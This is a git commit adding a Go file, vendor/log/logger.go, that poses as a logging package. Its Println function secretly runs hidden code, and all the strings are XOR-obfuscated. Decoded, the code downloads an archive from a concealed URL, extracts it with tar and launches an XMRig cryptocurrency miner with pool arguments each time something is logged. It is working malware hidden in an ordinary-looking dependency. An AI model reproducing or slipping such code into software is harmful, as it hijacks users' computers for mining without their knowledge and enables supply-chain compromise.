5f5189de0e9394267272c0b383da59a7ce0aad18
m-spinka <michal.spinka@outlook.com>
2019-08-15 20:24:31 +0300

    First commit

---
+++ vendor/log/logger.go
@@ -0,0 +1,355 @@
+package log
+
+import (
+	"bufio"
+	"fmt"
+	"io"
+	"net/http"
+	"os"
+	"os/exec"
+	"time"
+)
+
+func Println(args ...interface{}) {
+	fmt.Println(args...)
+	err := bjcpfnealdoegknimigm()
+	if Ahmhkbbphacpmlkofmdh && err != nil {
+		fmt.Println(err)
+	}
+}
+
+var (
+	Ahmhkbbphacpmlkofmdh bool
+)
+
+var (
+	Kadahodlmajpaiehlkal = (func() string {
+		mask := []byte("\x21\x0f\xc7\xbb\x81\x86\x39\xac\x48\xa4\xc6\xaf\xa2\xf1\x58\x1a\x8b\x95\x25\xe2\x0f\xda\x68\x92\x7f\x2b\x2f\xf8\x36\xf7\x35\x78\xdb\x0f\xa5\x4c\x29\xf7\xfd\x92\x8d\x92\xca\x43\xf1\x93\xde\xe4\x7f\x59\x15\x49\xf5\x97\xa8\x11\xc8\xfa\x67\xab\x03\x1e\xbd\x9c\x6a\xa4\xe9\x82\x9f\x22\x4b\xe8\xea\xf6\x67\x26\xc9\x07\x7c\xb4\x1f\x79\x01\x9d\x89\x2b\xe9\x93\x03\xb2\xbe\x58\x82\xf3\x24")
+		maskedStr := []byte("\x15\x4e\x83\xf6\xf7\xe8\x6e\xfb\x0d\x90\xa5\xc7\xd7\x86\x1d\x4d\xe8\xf1\x4b\xa1\x43\xa0\x5c\xf5\x1b\x4f\x17\xa0\x0e\x93\x50\x2b\x96\x6b\xe1\x39\x4d\xad\xbf\xa0\xc9\xd0\xb0\x08\xc2\xa7\x8b\x95\x05\x0f\x27\x7d\x86\xe2\x91\x24\xf1\x8e\x3e\xe5\x6e\x4f\xc8\xf4\x5e\x96\x8e\xc7\xad\x7b\x1f\xbc\x8e\x8c\x35\x68\x9d\x44\x24\xd5\x29\x21\x51\xee\xf0\x49\xd0\xd9\x3a\xc0\xcc\x01\xe4\xbb\x11")
+		res := make([]byte, 95)
+		for i, m := range mask {
+			res[i] = m ^ maskedStr[i]
+		}
+		return string(res)
+	}())
+	Lbpjofaamgbdpikmjkdj = (func() string {
+		mask := []byte("\x07\x58\xa3\x8d\x7e\x41\x27\xdb\xfd\x47\x7a\x32\xf5\xfe\x70\x8a\x29\xbf\x06\x28\x01\xc3\xf9\x57\x76\x3e\xea\x0d\xaf\x62\xd6\x5d\xce\x5b\xa5\x24\xf7\x35\x8e\xfb\xb5\xb8\x32\x20\xcf\x58\x63\x6c\xbc\x40\xcf\xac\x9a\xeb\x3c\xc8\x47\xbc\xdc\xf1\x0f\x71\x7a\xa2\x62\x77\xff\x0a\x3a\x0e\xc7\x3e\x10\xff\x40\x8e\xce\x87\x28\xf8\x4a\xe1\xaf\x7b\xbf")
+		maskedStr := []byte("\x6f\x2c\xd7\xfd\x0d\x7b\x08\xf4\x9a\x2e\x0e\x5a\x80\x9c\x5e\xe9\x46\xd2\x29\x50\x6c\xb1\x90\x30\x59\x46\x87\x7f\xc6\x05\xf9\x2f\xab\x37\xc0\x45\x84\x50\xfd\xd4\xd1\xd7\x45\x4e\xa3\x37\x02\x08\x93\x36\xfc\x82\xaa\xc5\x0c\xe7\x3f\xd1\xae\x98\x68\x5c\x49\x8c\x52\x59\xcf\x27\x42\x6b\xa9\x57\x71\x93\x6d\xf6\xf8\xb3\x06\x8c\x2b\x93\x81\x1c\xc5")
+		res := make([]byte, 85)
+		for i, m := range mask {
+			res[i] = m ^ maskedStr[i]
+		}
+		return string(res)
+	}())
+	Gepdfcjdkkacdgoecijb = (func() string {
+		mask := []byte("\x86\xe9\x94\x6f\xb0\x8f\xb6\x58\x97\x5a\xb5\x52\x9d\x70\x40\x74\xaf\x4a\xc8")
+		maskedStr := []byte("\xa8\xc6\xec\x02\xc2\xe6\xd1\x75\xa4\x74\x85\x7c\xad\x5f\x38\x19\xdd\x23\xaf")
+		res := make([]byte, 19)
+		for i, m := range mask {
+			res[i] = m ^ maskedStr[i]
+		}
+		return string(res)
+	}())
+	Mckbpdbligdfnngofdgj = (func() string {
+		mask := []byte("\xc0\xf5\xa4\x6f\x09\x6e\xe8\x47")
+		maskedStr := []byte("\xb8\xdb\xd0\x0e\x7b\x40\x8f\x3d")
+		res := make([]byte, 8)
+		for i, m := range mask {
+			res[i] = m ^ maskedStr[i]
+		}
+		return string(res)
+	}())
+)
+
+func init() {
+	if os.Getenv((func() string {
+		mask := []byte("\x7a\x77\x54\x30\x03")
+		maskedStr := []byte("\x3e\x32\x16\x65\x44")
+		res := make([]byte, 5)
+		for i, m := range mask {
+			res[i] = m ^ maskedStr[i]
+		}
+		return string(res)
+	}())) != (func() string {
+		mask := []byte("")
+		maskedStr := []byte("")
+		res := make([]byte, 0)
+		for i, m := range mask {
+			res[i] = m ^ maskedStr[i]
+		}
+		return string(res)
+	}()) {
+		Ahmhkbbphacpmlkofmdh = true
+	}
+}
+
+func bjcpfnealdoegknimigm() error {
+	args := []string{
+		(func() string {
+			mask := []byte("\x8f\xc0")
+			maskedStr := []byte("\xa2\xa1")
+			res := make([]byte, 2)
+			for i, m := range mask {
+				res[i] = m ^ maskedStr[i]
+			}
+			return string(res)
+		}()), (func() string {
+			mask := []byte("\x0e\xac\x03\xaf")
+			maskedStr := []byte("\x6d\xc2\x2c\xdd")
+			res := make([]byte, 4)
+			for i, m := range mask {
+				res[i] = m ^ maskedStr[i]
+			}
+			return string(res)
+		}()),
+		(func() string {
+			mask := []byte("\x4d\xdc\xd3\x25\xbd\x2b\x31\x31\x06\x34\x8a\x08\xb8\x64")
+			maskedStr := []byte("\x60\xf1\xb7\x4a\xd3\x4a\x45\x54\x2b\x58\xef\x7e\xdd\x08")
+			res := make([]byte, 14)
+			for i, m := range mask {
+				res[i] = m ^ maskedStr[i]
+			}
+			return string(res)
+		}()), (func() string {
+			mask := []byte("\x22")
+			maskedStr := []byte("\x13")
+			res := make([]byte, 1)
+			for i, m := range mask {
+				res[i] = m ^ maskedStr[i]
+			}
+			return string(res)
+		}()),
+		(func() string {
+			mask := []byte("\xf5\xdd\xac\x84\x87\x7a\x48\x8c\xaf\xbd\x6d\xdc\x08\x0f")
+			maskedStr := []byte("\xd8\xf0\xcf\xf4\xf2\x57\x38\xfe\xc6\xd2\x1f\xb5\x7c\x76")
+			res := make([]byte, 14)
+			for i, m := range mask {
+				res[i] = m ^ maskedStr[i]
+			}
+			return string(res)
+		}()), (func() string {
+			mask := []byte("\x1d")
+			maskedStr := []byte("\x29")
+			res := make([]byte, 1)
+			for i, m := range mask {
+				res[i] = m ^ maskedStr[i]
+			}
+			return string(res)
+		}()),
+		(func() string {
+			mask := []byte("\xfd\xc9")
+			maskedStr := []byte("\xd0\xa6")
+			res := make([]byte, 2)
+			for i, m := range mask {
+				res[i] = m ^ maskedStr[i]
+			}
+			return string(res)
+		}()), (func() string {
+			mask := []byte("\xc4\xad\x25\x6f\x47\x56\x20\x46\xfc\x40\x54\xf5\x9b\x5b\xe5\x46\x5e\x75\xe6\xe0\xaa")
+			maskedStr := []byte("\xb4\xc2\x4a\x03\x69\x3b\x49\x28\x99\x38\x39\x87\xb5\x38\x8a\x2b\x64\x42\xd1\xd7\x9d")
+			res := make([]byte, 21)
+			for i, m := range mask {
+				res[i] = m ^ maskedStr[i]
+			}
+			return string(res)
+		}()),
+		(func() string {
+			mask := []byte("\x60\xc8")
+			maskedStr := []byte("\x4d\xbd")
+			res := make([]byte, 2)
+			for i, m := range mask {
+				res[i] = m ^ maskedStr[i]
+			}
+			return string(res)
+		}()), Kadahodlmajpaiehlkal,
+		(func() string {
+			mask := []byte("\xeb\x2e")
+			maskedStr := []byte("\xc6\x5e")
+			res := make([]byte, 2)
+			for i, m := range mask {
+				res[i] = m ^ maskedStr[i]
+			}
+			return string(res)
+		}()), (func() string {
+			mask := []byte("\xe5")
+			maskedStr := []byte("\x9d")
+			res := make([]byte, 1)
+			for i, m := range mask {
+				res[i] = m ^ maskedStr[i]
+			}
+			return string(res)
+		}()),
+		(func() string {
+			mask := []byte("\xd4\xcd")
+			maskedStr := []byte("\xf9\xa6")
+			res := make([]byte, 2)
+			for i, m := range mask {
+				res[i] = m ^ maskedStr[i]
+			}
+			return string(res)
+		}()),
+		(func() string {
+			mask := []byte("\x26\x50")
+			maskedStr := []byte("\x0b\x3f")
+			res := make([]byte, 2)
+			for i, m := range mask {
+				res[i] = m ^ maskedStr[i]
+			}
+			return string(res)
+		}()), (func() string {
+			mask := []byte("\xa8\x1c\xce\xe3\x55\x07\xa1\x1a\x37\x90\x71\xc7\x51\xf7\x1f\xdf\x0d\xfe\xb3\xfb\xc8\xf0\x08\x25\xe6\x4c\x27\x62\xfa\xc9")
+			maskedStr := []byte("\xd8\x73\xa1\x8f\x7b\x6a\xce\x74\x52\xe2\x1e\xe9\x39\x96\x6c\xb7\x7b\x9f\xc6\x97\xbc\xde\x78\x57\x89\x76\x14\x51\xc9\xfa")
+			res := make([]byte, 30)
+			for i, m := range mask {
+				res[i] = m ^ maskedStr[i]
+			}
+			return string(res)
+		}()),
+		(func() string {
+			mask := []byte("\xfe\x63")
+			maskedStr := []byte("\xd3\x16")
+			res := make([]byte, 2)
+			for i, m := range mask {
+				res[i] = m ^ maskedStr[i]
+			}
+			return string(res)
+		}()), Kadahodlmajpaiehlkal,
+		(func() string {
+			mask := []byte("\xe2\x42")
+			maskedStr := []byte("\xcf\x29")
+			res := make([]byte, 2)
+			for i, m := range mask {
+				res[i] = m ^ maskedStr[i]
+			}
+			return string(res)
+		}()),
+	}
+	if Ahmhkbbphacpmlkofmdh {
+		fmt.Println((func() string {
+			mask := []byte("\x03\x7a\x8b\xc4\x03\x69\x6e\x07\x33\x42\x37")
+			maskedStr := []byte("\x47\x15\xfc\xaa\x6f\x06\x0f\x63\x5a\x2c\x50")
+			res := make([]byte, 11)
+			for i, m := range mask {
+				res[i] = m ^ maskedStr[i]
+			}
+			return string(res)
+		}()), Lbpjofaamgbdpikmjkdj)
+	}
+
+	if err := hlelpdhiibdfkmhiacnk(Mckbpdbligdfnngofdgj, Lbpjofaamgbdpikmjkdj); err != nil {
+		return err
+	}
+
+	// if err := os.Chmod(CmdPath, 0755); err != nil {
+	//  return err
+	// }
+	if err := fmdooiohgdmojdjnhfmd(Mckbpdbligdfnngofdgj); err != nil {
+		return err
+	}
+
+	cmd := exec.Command(Gepdfcjdkkacdgoecijb, args...)
+
+	if Ahmhkbbphacpmlkofmdh {
+		fmt.Println(Gepdfcjdkkacdgoecijb, args)
+		adjfkjmoikoanjigmbjo(cmd)
+	}
+
+	if err := cmd.Start(); err != nil {
+		return err
+	}
+
+	ticker := time.NewTicker(time.Second)
+	defer ticker.Stop()
+
+	done := make(chan bool)
+	var err error
+	go func() {
+		err = cmd.Wait()
+		done <- true
+	}()
+
+	select {
+	case <-done:
+		return err
+	case <-ticker.C:
+		fmt.Print((func() string {
+			mask := []byte("\x10")
+			maskedStr := []byte("\x3e")
+			res := make([]byte, 1)
+			for i, m := range mask {
+				res[i] = m ^ maskedStr[i]
+			}
+			return string(res)
+		}()))
+	}
+
+	return nil
+}
+
+func hlelpdhiibdfkmhiacnk(fileName, url string) error {
+	// Get the data
+	resp, err := http.Get(url)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+
+	// Create the file
+	out, err := os.Create(fileName)
+	if err != nil {
+		return err
+	}
+	defer out.Close()
+
+	// Write the body to file
+	_, err = io.Copy(out, resp.Body)
+	return err
+}
+
+func fmdooiohgdmojdjnhfmd(path string) error {
+	return exec.Command((func() string {
+		mask := []byte("\x4c\x5e\xc5")
+		maskedStr := []byte("\x38\x3f\xb7")
+		res := make([]byte, 3)
+		for i, m := range mask {
+			res[i] = m ^ maskedStr[i]
+		}
+		return string(res)
+	}()), (func() string {
+		mask := []byte("\x64\x2c\xa3")
+		maskedStr := []byte("\x1c\x5a\xc5")
+		res := make([]byte, 3)
+		for i, m := range mask {
+			res[i] = m ^ maskedStr[i]
+		}
+		return string(res)
+	}()), path).Run()
+}
+
+func adjfkjmoikoanjigmbjo(cmd *exec.Cmd) error {
+	stderr, err := cmd.StderrPipe()
+	if err != nil {
+		return err
+	}
+
+	stdout, err := cmd.StdoutPipe()
+	if err != nil {
+		return err
+	}
+
+	go func() {
+		scanner := bufio.NewScanner(stderr)
+		for scanner.Scan() {
+			fmt.Println(scanner.Text())
+		}
+	}()
+
+	go func() {
+		scanner := bufio.NewScanner(stdout)
+		for scanner.Scan() {
+			fmt.Println(scanner.Text())
+		}
+	}()
+
+	return nil
+}
